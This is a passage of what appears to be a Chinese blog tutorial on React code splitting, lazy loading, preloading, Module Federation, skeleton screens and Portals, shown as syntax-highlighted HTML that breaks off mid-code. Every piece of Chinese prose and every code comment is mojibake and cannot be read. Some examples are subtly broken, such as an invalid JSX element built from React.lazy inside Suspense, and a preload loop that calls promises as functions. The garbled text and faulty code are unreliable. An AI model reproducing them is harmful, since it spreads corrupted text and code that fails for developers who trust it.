é¢„åŠ è½½ç»„ä»¶</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">PreloadComponent</span>(<span class="hljs-params">&#123; component &#125;</span>) &#123;<br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    component.<span class="hljs-title function_">preload</span>();<br>  &#125;, [component]);<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-comment">// è·¯ç”±é¢„åŠ è½½</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// é¢„åŠ è½½å¯èƒ½è®¿é—®çš„é¡µé¢</span><br>    <span class="hljs-keyword">const</span> preloadPages = [<br>      <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./pages/AboutPage&#x27;</span>),<br>      <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./pages/ContactPage&#x27;</span>)<br>    ];<br>    <br>    <span class="hljs-comment">// ç”¨æˆ·ç©ºé—²æ—¶é¢„åŠ è½½</span><br>    <span class="hljs-keyword">const</span> idleCallback = <span class="hljs-title function_">requestIdleCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      preloadPages.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">preload</span> =&gt;</span> <span class="hljs-title function_">preload</span>());<br>    &#125;);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">cancelIdleCallback</span>(idleCallback);<br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Router</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Routes</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">HomePage</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/about&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          &lt;<span class="hljs-attr">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Loader</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">            &lt;React.lazy(() =&gt; import(&#x27;./pages/AboutPage&#x27;)) /&gt;</span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">        &#125; /&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/contact&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          &lt;<span class="hljs-attr">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Loader</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">            &lt;React.lazy(() =&gt; import(&#x27;./pages/ContactPage&#x27;)) /&gt;</span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">        &#125; /&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      &#123;/* æ‚¬åœé¢„åŠ è½½ */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">NavLink</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/about&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onMouseEnter</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> import(&#x27;./pages/AboutPage&#x27;)&#125;</span><br><span class="language-xml">      &gt;</span><br><span class="language-xml">        å…³äºæˆ‘ä»¬</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">NavLink</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Router</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ€§èƒ½ä¼˜åŒ–è¿›é˜¶æŠ€å·§"><a href="#æ€§èƒ½ä¼˜åŒ–è¿›é˜¶æŠ€å·§" class="headerlink" title="æ€§èƒ½ä¼˜åŒ–è¿›é˜¶æŠ€å·§"></a>æ€§èƒ½ä¼˜åŒ–è¿›é˜¶æŠ€å·§</h3><p><strong>æ¨¡å—è”åˆï¼ˆå¾®å‰ç«¯ï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŠ¨æ€åŠ è½½è¿œç¨‹æ¨¡å—</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">RemoteComponent</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span><br>  <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;remote_app/Component&#x27;</span>).<span class="hljs-title function_">catch</span>(<span class="hljs-function">() =&gt;</span> <br>    <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./FallbackComponent&#x27;</span>)<br>  )<br>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">RemoteLoader</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">RemoteComponent</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// Webpack é…ç½®</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">plugins</span>: [<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModuleFederationPlugin</span>(&#123;<br>      <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;host_app&#x27;</span>,<br>      <span class="hljs-attr">remotes</span>: &#123;<br>        <span class="hljs-attr">remote_app</span>: <span class="hljs-string">&#x27;remote_app@http://remote-domain.com/remoteEntry.js&#x27;</span><br>      &#125;<br>    &#125;)<br>  ]<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>èµ„æºä¼˜å…ˆçº§æ§åˆ¶</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é¢„åŠ è½½å…³é”®èµ„æº</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">CriticalResourceLoader</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Head</span>&gt;</span></span><br><span class="language-xml">      &#123;/* å…³é”® CSS */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">link</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;preload&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/critical.css&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">as</span>=<span class="hljs-string">&quot;style&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onLoad</span>=<span class="hljs-string">&quot;this.rel=&#x27;stylesheet&#x27;&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      /&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      &#123;/* å…³é”®è„šæœ¬ */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">link</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;modulepreload&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/main.js&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">as</span>=<span class="hljs-string">&quot;script&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      /&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      &#123;/* å­—ä½“é¢„åŠ è½½ */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">link</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;preload&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/fonts/inter.woff2&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">as</span>=<span class="hljs-string">&quot;font&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;font/woff2&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">crossOrigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Head</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// å»¶è¿ŸåŠ è½½éå…³é”®èµ„æº</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">LazyNonCritical</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">loadNonCritical</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>      <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./analytics.js&#x27;</span>);<br>      <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./chat-widget.js&#x27;</span>);<br>    &#125;;<br>    <br>    <span class="hljs-comment">// ç©ºé—²æ—¶åŠ è½½</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;requestIdleCallback&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-variable language_">window</span>) &#123;<br>      <span class="hljs-title function_">requestIdleCallback</span>(loadNonCritical);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-built_in">setTimeout</span>(loadNonCritical, <span class="hljs-number">5000</span>);<br>    &#125;<br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>éª¨æ¶å±ä¼˜åŒ–æŠ€å·§</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é«˜çº§éª¨æ¶å±ç»„ä»¶</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ProductCardSkeleton</span>(<span class="hljs-params">&#123; count = <span class="hljs-number">1</span> &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(&#123; <span class="hljs-attr">length</span>: count &#125;).<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">_, index</span>) =&gt;</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;index&#125;</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;skeleton-card&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;skeleton-image&quot;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;skeleton-line w-3/4&quot;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;skeleton-line w-1/2&quot;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;skeleton-line w-1/3&quot;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  ));<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs CSS">// CSS åŠ¨ç”»ä¼˜åŒ–<br><span class="hljs-keyword">@keyframes</span> pulse &#123;<br>  <span class="hljs-number">0%</span>, <span class="hljs-number">100%</span> &#123; <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; &#125;<br>  <span class="hljs-number">50%</span> &#123; <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.5</span>; &#125;<br>&#125;<br><br><span class="hljs-selector-class">.skeleton-card</span> &#123;<br>  <span class="hljs-attribute">animation</span>: pulse <span class="hljs-number">2s</span> <span class="hljs-built_in">cubic-bezier</span>(<span class="hljs-number">0.4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.6</span>, <span class="hljs-number">1</span>) infinite;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#e5e7eb</span>;<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">0.5rem</span>;<br>  <span class="hljs-attribute">overflow</span>: hidden;<br>&#125;<br><br><span class="hljs-selector-class">.skeleton-line</span> &#123;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">1rem</span>;<br>  <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">0.75rem</span>;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#d1d5db</span>;<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">0.25rem</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ"><a href="#å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ" class="headerlink" title="å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ"></a>å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h3><p><strong>å¤§å‹æ¨¡å—åŠ è½½ä¼˜åŒ–</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åˆ†å—åŠ è½½å¤§å‹æ¨¡å—</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadLargeModule</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [part1, part2, part3] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([<br>    <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./modulePart1&#x27;</span>),<br>    <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./modulePart2&#x27;</span>),<br>    <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./modulePart3&#x27;</span>)<br>  ]);<br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    ...part1,<br>    ...part2,<br>    ...part3<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// æ¸è¿›å¼åŠ è½½</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">LargeComponent</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-title function_">async</span> () =&gt; &#123;<br>  <span class="hljs-comment">// å…ˆåŠ è½½æ ¸å¿ƒéƒ¨åˆ†</span><br>  <span class="hljs-keyword">const</span> core = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./CoreComponent&#x27;</span>);<br>  <br>  <span class="hljs-comment">// ç©ºé—²æ—¶åŠ è½½å¢å¼ºéƒ¨åˆ†</span><br>  <span class="hljs-title function_">requestIdleCallback</span>(<span class="hljs-title function_">async</span> () =&gt; &#123;<br>    <span class="hljs-keyword">const</span> enhancements = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./Enhancements&#x27;</span>);<br>    core.<span class="hljs-title function_">enhance</span>(enhancements);<br>  &#125;);<br>  <br>  <span class="hljs-keyword">return</span> core;<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ul><li>æ ¸å¿ƒä»·å€¼ï¼š<ul><li>æ˜¾è‘—å‡å°‘é¦–å±åŠ è½½æ—¶é—´</li><li>æŒ‰éœ€åŠ è½½æå‡èµ„æºåˆ©ç”¨ç‡</li><li>æ”¹å–„ç”¨æˆ·ä½“éªŒ</li></ul></li><li>å…³é”®æŠ€æœ¯ï¼š<ul><li>React.lazyï¼šç»„ä»¶åŠ¨æ€å¯¼å…¥</li><li>Suspenseï¼šåŠ è½½çŠ¶æ€ç®¡ç†</li><li>åŠ¨æ€ import()ï¼šä»£ç åˆ†å‰²åŸºç¡€</li></ul></li><li>æœ€ä½³å®è·µï¼š<ul><li>è·¯ç”±çº§åˆ†å‰²ï¼šæŒ‰é¡µé¢æ‹†åˆ†</li><li>ç»„ä»¶çº§æ‡’åŠ è½½ï¼šéæ ¸å¿ƒåŠŸèƒ½å»¶è¿ŸåŠ è½½</li><li>é¢„åŠ è½½ä¼˜åŒ–ï¼šé¢„æµ‹ç”¨æˆ·è¡Œä¸º</li><li>éª¨æ¶å±æŠ€æœ¯ï¼šä¼˜åŒ–åŠ è½½ä½“éªŒ</li></ul></li><li>React 18 å¢å¼ºï¼š<ul><li>æµå¼ SSR æ¸²æŸ“</li><li>å¹¶å‘æ¨¡å¼ä¸‹çš„ Suspense</li><li>æ›´ç²¾ç»†çš„åŠ è½½æ§åˆ¶</li></ul></li><li>ä¼ä¸šçº§æ–¹æ¡ˆï¼š<ul><li>é”™è¯¯è¾¹ç•Œé›†æˆ</li><li>å¾®å‰ç«¯æ¶æ„æ”¯æŒ</li><li>æ€§èƒ½ç›‘æ§ä¸åˆ†æ</li></ul></li><li>å¸¸è§é—®é¢˜è§£å†³ï¼š<ul><li>åŠ è½½é—ªçƒæ§åˆ¶</li><li>æ¨¡å—åŠ è½½å¤±è´¥å¤„ç†</li><li>å¤§å‹æ¨¡å—ä¼˜åŒ–</li></ul></li></ul><h2 id="4-4-Portalsï¼ˆæ¸²æŸ“åˆ°-DOM-å¤–éƒ¨èŠ‚ç‚¹ï¼‰"><a href="#4-4-Portalsï¼ˆæ¸²æŸ“åˆ°-DOM-å¤–éƒ¨èŠ‚ç‚¹ï¼‰" class="headerlink" title="4.4 Portalsï¼ˆæ¸²æŸ“åˆ° DOM å¤–éƒ¨èŠ‚ç‚¹ï¼‰"></a>4.4 Portalsï¼ˆæ¸²æŸ“åˆ° DOM å¤–éƒ¨èŠ‚ç‚¹ï¼‰</h2><h3 id="Portals-æ ¸å¿ƒæ¦‚å¿µ"><a href="#Portals-æ ¸å¿ƒæ¦‚å¿µ" class="headerlink" title="Portals æ ¸å¿ƒæ¦‚å¿µ"></a>Portals æ ¸å¿ƒæ¦‚å¿µ</h3><p><strong>è§£å†³çš„é—®é¢˜åœºæ™¯</strong></p><pre class="mermaid">graph TD    A[çˆ¶ç»„ä»¶] --> B[overflow: hidden]    A --> C[z-index å±‚çº§é™åˆ¶]    A --> D[transform ä¸Šä¸‹æ–‡]    B --> E[å­å…ƒç´ æ˜¾ç¤ºä¸å…¨]    C --> F[æ¨¡æ€æ¡†è¢«é®æŒ¡]    D --> G[fixed å®šä½å¤±æ•ˆ]</pre><p><strong>Portals æ ¸å¿ƒèƒ½åŠ›</strong></p><table><thead><tr><th align="left">èƒ½åŠ›</th><th align="left">æè¿°</th><th align="left">åº”ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left">çªç ´å±‚çº§é™åˆ¶</td><td align="left">æ¸²æŸ“åˆ° DOM æ ‘ä»»æ„ä½ç½®</td><td align="left">æ¨¡æ€æ¡†ã€å¼¹å‡ºå±‚</td></tr><tr><td align="left">ä¿ç•™ React ä¸Šä¸‹æ–‡</td><td align="left">ä¿æŒäº‹ä»¶å†’æ³¡å’Œä¸Šä¸‹æ–‡</td><td align="left">å…¨å±€é€šçŸ¥</td></tr><tr><td align="left">æ ·å¼éš”ç¦»</td><td align="left">é¿å…çˆ¶å®¹å™¨æ ·å¼å½±å“</td><td align="left">å·¥å…·æç¤º</td></tr><tr><td align="left">æ— éšœç¢æ”¯æŒ</td><td align="left">ç®¡ç†ç„¦ç‚¹å’Œé”®ç›˜äº‹ä»¶</td><td align="left">æ— éšœç¢å¯¹è¯æ¡†</td></tr></tbody></table><h3 id="åŸºç¡€ç”¨æ³•ä¸API"><a href="#åŸºç¡€ç”¨æ³•ä¸API" class="headerlink" title="åŸºç¡€ç”¨æ³•ä¸API"></a>åŸºç¡€ç”¨æ³•ä¸API</h3><p><strong>ReactDOM.createPortal åŸºç¡€</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">ReactDOM</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-dom&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Modal</span>(<span class="hljs-params">&#123; children, isOpen &#125;</span>) &#123;<br>  <span class="hljs-keyword">if</span> (!isOpen) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  <br>  <span class="hljs-comment">// åˆ›å»º Portal æ¸²æŸ“åˆ° body å¤–çš„ç‹¬ç«‹å®¹å™¨</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">createPortal</span>(<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;modal&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;modal-content&quot;</span>&gt;</span></span><br><span class="language-xml">        &#123;children&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>,<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;modal-root&#x27;</span>) <span class="hljs-comment">// å¤–éƒ¨å®¹å™¨</span><br>  );<br>&#125;<br><br><span class="hljs-comment">// åœ¨ public/index.html ä¸­æ·»åŠ å®¹å™¨</span><br>&lt;body&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;modal-root&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span> &lt;!-- <span class="hljs-title class_">Portal</span> ç›®æ ‡å®¹å™¨ --&gt;<br>&lt;/body&gt;<br></code></pre></td></tr></table></figure><p><strong>åŠ¨æ€å®¹å™¨ç®¡ç†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">SmartPortal</span>(<span class="hljs-params">&#123; children, containerId = <span class="hljs-string">&#x27;portal-root&#x27;</span> &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> [container, setContainer] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// æŸ¥æ‰¾æˆ–åˆ›å»ºå®¹å™¨</span><br>    <span class="hljs-keyword">let</span> portalContainer = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(containerId);<br>    <br>    <span class="hljs-keyword">if</span> (!portalContainer) 